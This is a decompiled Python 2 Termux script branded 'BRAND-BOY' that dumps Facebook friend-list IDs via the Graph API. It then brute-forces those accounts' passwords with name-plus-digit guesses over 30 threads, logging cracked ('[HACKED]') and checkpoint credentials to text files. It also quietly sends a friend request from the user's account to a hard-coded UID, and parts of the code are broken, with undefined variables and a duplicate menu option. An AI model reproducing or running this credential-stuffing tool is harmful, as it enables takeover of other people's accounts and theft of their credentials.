# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:47:43) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: /sdcard/james1.py
# Compiled at: 2021-04-24 21:26:31
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
os.system('clear')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
    os.system('apt update && apt install nodejs -y')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/ruby'):
    os.system('apt install ruby -y && gem install lolcat')
from requests.exceptions import ConnectionError
os.system('git pull')
if not os.path.isfile('/data/data/com.termux/files/home/jjjjj/...../node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd .....  && npm install')
    os.system('cd .....  && node index.js &')
    os.system('clear')
    time.sleep(10)
elif os.path.isfile('/data/data/com.termux/files/home/jjjjj/...../node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd ..... && node index.js &')
    os.system('clear')
    time.sleep(10)
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf-8')
c = '\x1b[1;32m'
c2 = '\x1b[0;97m'
c3 = '\x1b[1;31m'
useragents = [
 'Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36']
hm = random.choice(useragents)
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', hm)]
s = requests.Session()
api = 'https://graph.facebook.com/{}'
hea = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'}
http_proxy = 'http://10.10.1.10:3128'
https_proxy = 'https://10.10.1.11:1080'

def logo():
    os.system('echo -e "\n\n\n\n\n-----------------------------------------------\n\n\xe2\x9e\xa3NAME         : SOMI AWAN  \n\xe2\x9e\xa3CYBER NAME   : BRAND-BOY \n\xe2\x9e\xa3WHATSAPP NO  : 03455453538\n\xe2\x9e\xa3COMMAMD TYPE : TOKEN-LOGIN \n\xe2\x9e\xa3NEW UPDATE   : TOKEN EXPIRING PROBLEM CLEAR \n\n-----------------------------------------------" | lolcat')


def method_menu():
    logo()
    print ''
    print '\t    \x1b[1;97m(\x1b[1;92mMain Menu\x1b[1;97m)'
    print ''
    print '\x1b[1;97m(\x1b[1;93m1\x1b[1;97m) key-Api Method'
    print '\x1b[1;97m(\x1b[1;91m2\x1b[1;97m) L-host Method'
    print ''
    method_menu_select()


def method_menu_select():
    afza = raw_input('\x1b[1;32m\xe2\x80\xa2\xe2\x80\xa2> ')
    if afza == '1':
        b_menu()
    elif afza == '2':
        l_menu()
    else:
        print ''
        print '\t    \x1b[1;31mSelect valid option \x1b[0;97m'
        print ''
        method_menu_select()


def login():
    os.system('clear')
    logo()
    print ''
    print '\t    ' + c + '\x1b[1;97m(\x1b[1;93mLogin Menu\x1b[1;97m)' + c2
    print ''
    print '\x1b[1;97m(\x1b[1;92m1\x1b[1;97m) Token Login'
    print '\x1b[1;97m(\x1b[1;92m2\x1b[1;97m) ID/Pass Login'
    print ''
    login_select()


def login_select():
    afza = raw_input('\x1b[1;91m\xe2\x80\xa2\xe2\x80\xa2> ')
    if afza == '1':
        os.system('clear')
        logo()
        print ''
        print '\t    \x1b[1;97m(\x1b[1;96mToken Login\x1b[1;97m)'
        print ''
        token = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Token : ')
        token_s = open('.fb_token.txt', 'w')
        token_s.write(token)
        token_s.close()
        try:
            r = requests.get('https://graph.facebook.com/me?access_token=' + token)
            q = json.loads(r.text)
            name = q['name']
            nm = name.rsplit(' ')[0]
            print ''
            print '\t\x1b[1;32mToken logged in as : ' + nm + '\x1b[0;97m'
            time.sleep(3)
            method_menu()
        except (KeyError, IOError):
            print ''
            print '\t    \x1b[1;31mToken not valid\x1b[0;97m'
            print ''
            raw_input(' Press Enter To Try Again ')
            login()

    elif afza == '2':
        login_fb()
    else:
        print ''
        print '\t    ' + c + 'Select valid method' + c2
        print ''
        login_select()


def login_fb():
    os.system('clear')
    logo()
    print ''
    print '\t    \x1b[1;97m(\x1b[1;96mNormal login\x1b[1;97m)\x1b[0;97m'
    print ''
    id = raw_input('\x1b[1;31m ID/Mail/Num : ')
    id1 = id.replace(' ', '')
    id2 = id1.replace('(', '')
    uid = id2.replace(')', '')
    pwd = raw_input('\x1b[1;33m Password   : ')
    print ''
    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd, headers=header).text
    q = json.loads(data)
    if 'loc' in q:
        hamza = open('.fb_token.txt', 'w')
        hamza.write(q['loc'])
        hamza.close()
        requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token=' + q['loc'])
        time.sleep(1)
        print '\t    \x1b[1;32mLogged in successfully\x1b[0;97m'
        time.sleep(1)
        method_menu()
    elif 'www.facebook.com' in q['error']:
        print '\t    \x1b[1;31mUser must verify account before login\x1b[0;97m'
        print ''
        time.sleep(1)
        raw_input('\x1b[1;31m Press Enter To Try Again ')
        login_fb()
    else:
        print '\t\x1b[1;31mID/Number/Password May Be Wrong\x1b[0;97m'
        print ''
        raw_input('\x1b[1;31m Press Enter To Try Again ')
        login_fb()


def b_menu():
    global token
    os.system('clear')
    logo()
    try:
        token = open('.fb_token.txt', 'r').read()
    except (KeyError, IOError):
        login()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        nm = q['name']
        nmf = nm.rsplit(' ')[0]
        ok = nmf
    except (KeyError, IOError):
        print ''
        print '\t    ' + c + 'ID has checkpoint' + c2
        print ''
        os.system('rm -rf .fb_token.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        logo()
        print ''
        print '\t    \x1b[1;31mTurn on mobile data OR wifi \x1b[0;97m'
        print ''
        time.sleep(1)
        raw_input('\x1b[1;31m Press Enter To Try Algain \x1b[0;97m')
        b_menu()

    os.system('clear')
    logo()
    print ''
    print '\t  ' + c + 'Logged In User' + ok + c2
    print ''
    os.system('echo -e "-----------------------------------------------"| lolcat')
    print ''
    print '\x1b[1;97m(\x1b[1;94m1\x1b[1;97m) Dump Public Friendlist'
    print '\x1b[1;97m(\x1b[1;94m2\x1b[1;97m) Crack From File'
    print '\x1b[1;97m(\x1b[1;94m3\x1b[1;97m) Show Token'
    print '\x1b[1;97m(\x1b[1;91m4\x1b[1;97m) Return Method Menu'
    print '\x1b[1;97m(\x1b[1;91m5\x1b[1;97m) Logout'
    print ''
    b_menu_select()


def b_menu_select():
    select = raw_input('\n\xe2\x80\xa2\xe2\x80\xa2> ')
    id = []
    oks = []
    cps = []
    if select == '1':
        dump()
    elif select == '2':
        os.system('clear')
        logo()
        try:
            uidlist = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) File Name: ')
            os.system('echo -e "-----------------------------------------------"| lolcat')
            for line in open(uidlist, 'r').readlines():
                id.append(line.strip())

        except (KeyError, IOError):
            os.system('echo -e "\t    [!] File Not Found." | lolcat')
            raw_input('Press Enter To Back. ')

    elif select == '3':
        view_token()
    elif select == '3':
        method_menu()
    elif select == '5':
        logout()
    else:
        print ''
        print '\t    ' + c + 'Select valid method' + c2
        print ''
        b_menu_select()
    os.system('echo -e "\t    Name Password" | lolcat')
    os.system('echo -e "\tExample : 123,1234,12345,786" | lolcat')
    p1 = raw_input(' \x1b[1;97m(\x1b[1;91m1\x1b[1;97m)Name + digit: ')
    p2 = raw_input(' \x1b[1;97m(\x1b[1;91m2\x1b[1;97m)Name + digit: ')
    p3 = raw_input(' \x1b[1;97m(\x1b[1;91m3\x1b[1;97m)Name + digit: ')
    p4 = raw_input(' \x1b[1;97m(\x1b[1;91m4\x1b[1;97m)Name + digit: ')
    os.system('echo -e "\t    Digits Password" | lolcat')
    os.system('echo -e "\tExample : 786786,102030" | lolcat')
    pass5 = raw_input(' \x1b[1;97m(\x1b[1;91m1\x1b[1;97m)Password: ')
    pass6 = raw_input(' \x1b[1;97m(\x1b[1;91m2\x1b[1;97m)Password: ')
    pass7 = raw_input(' \x1b[1;97m(\x1b[1;91m3\x1b[1;97m)Password: ')
    os.system('clear')
    logo()
    print ' Total IDs : ' + str(len(id))
    time.sleep(0.5)
    print ' The process is running in background'
    print ''
    print 47 * '-'
    print ''

    def main(arg):
        user = arg
        try:
		    os.mkdir('save')
		except OSError:
		    pass
        try:
            pass1 = b['first_name'] + p1
            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
            d = json.loads(q)
            if 'www.facebook.com' in d['error_msg']:
                print '\x1b[1;31m[Checkpoint] ' + uid + ' | ' + pass1
                cp = open('cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid)
            elif 'access_token' in d:
                print '\x1b[1;32m[HACKED] \x1b[1;30m' + uid + ' | ' + pass1 + '\x1b[1;0m'
                ok = open('ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid)
            else:
                pass2 = b['first_name'] + p2
                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                d = json.loads(q)
                if 'www.facebook.com' in d['error_msg']:
                    print '\x1b[1;31m[Checkpoint] ' + uid + ' | ' + pass2
                    cp = open('cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid)
                elif 'access_token' in d:
                    print '\x1b[1;32m[HACKED] \x1b[1;30m' + uid + ' | ' + pass2 + '\x1b[1;0m'
                    ok = open('ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid)
                else:
                    pass3 = b['first_name'] + p3
                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                    d = json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print '\x1b[1;31m[Checkpoint] ' + uid + ' | ' + pass3
                        cp = open('cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid)
                    elif 'access_token' in d:
                        print ' \x1b[1;32m[HACKED] \x1b[1;30m' + uid + ' | ' + pass3 + '\x1b[1;0m'
                        ok = open('ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid)
                    else:
                        pass4 = b['first_name'] + p4
                        q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                        d = json.loads(q)
                        if 'www.facebook.com' in d['error_msg']:
                            print '\x1b[1;31m[Checkpoint] ' + uid + ' | ' + pass4
                            cp = open('cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid)
                        elif 'access_token' in d:
                            print '\x1b[1;32m[HACKED] \x1b[1;30m' + uid + ' | ' + pass4 + '\x1b[1;0m'
                            ok = open('ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid)
                        else:
                            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                            d = json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print '\x1b[1;31m[Checkpoint] ' + uid + ' | ' + pass5
                                cp = open('cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid)
                            elif 'access_token' in d:
                                print '\x1b[1;32m[HACKED] \x1b[1;30m' + uid + ' | ' + pass5 + '\x1b[1;0m'
                                ok = open('ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid)
                            else:
                                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                d = json.loads(q)
                                if 'www.facebook.com' in d['error_msg']:
                                    print '\x1b[1;31m[Checkpoint] ' + uid + ' | ' + pass6
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid)
                                elif 'access_token' in d:
                                    print '\x1b[1;32m[HACKED] \x1b[1;30m' + uid + ' | ' + pass6 + '\x1b[1;0m'
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid)
                                else:
                                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\x1b[1;31m[Checkpoint] ' + uid + ' | ' + pass7
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\x1b[1;32m[HACKED] \x1b[1;30m' + uid + ' | ' + pass7 + '\x1b[1;0m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ' '
    print 47 * '-'
    print ''
    print '\x1b[1;91m Process has completed'
    print '\x1b[1;92m Total Cp/Ok : ' + str(len(cps)) + '/' + str(len(oks))
    print ''
    print 47 * '-'
    print ''
    raw_input('\x1b[1;93m Press enter to back ')
    b_menu()


def view_token():
    os.system('clear')
    logo()
    print ''
    print '\t    \x1b[1;32mLogged In Token \x1b[0;97m'
    print ''
    print ' Token : '
    os.system('cat .fb_token.txt')
    print ''
    raw_input('\x1b[1;93m Press enter to main menu ')
    b_menu()


def logout():
    os.system('clear')
    logo()
    print ''
    print '\t    ' + c + 'Logout Menu' + c2
    print ''
    raw_input('\x1b[1;91m Do you really want to logout ? ')
    os.system('rm -rf .fb_token.txt')
    method_menu()


def dump():
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
        os.system('clear')
        logo()

    ui = raw_input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] id public --> ')
    ih = raw_input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Name file -->')
    asw = raw_input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Limit --> ')
    if ui in ('', ):
        print '\n [!] please fill it right'
        time.sleep(1.7)
    try:
        os.mkdir('dump')
    except:
        pass

    wrt = open('dump/' + ih + '.txt', 'w')
    try:
        for i in s.get(api.format('%s/friends?limit=%s&access_token=%s' % (ui, asw, token)), headers=hea).json()['data']:
            id.append(i['id'])
            wrt.write('%s\n' % i['id'])
            sys.stdout.write('\r \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] id %s Total Clone %s  ' % (i['id'], len(id)))
            sys.stdout.flush()
            time.sleep(0.005)

        wrt.close()
        print '\n\n \x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] clone id public\n'
        exit(' \x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] file stored in: dump/%s.txt ' % ih)
        raw_input('Back')
        b_menu
    except OSError:
        print '\n [!] failed to save file '
        time.sleep(1.7)


if __name__ == '__main__':
    method_menu()
# okay decompiling /sdcard/ja.pyc
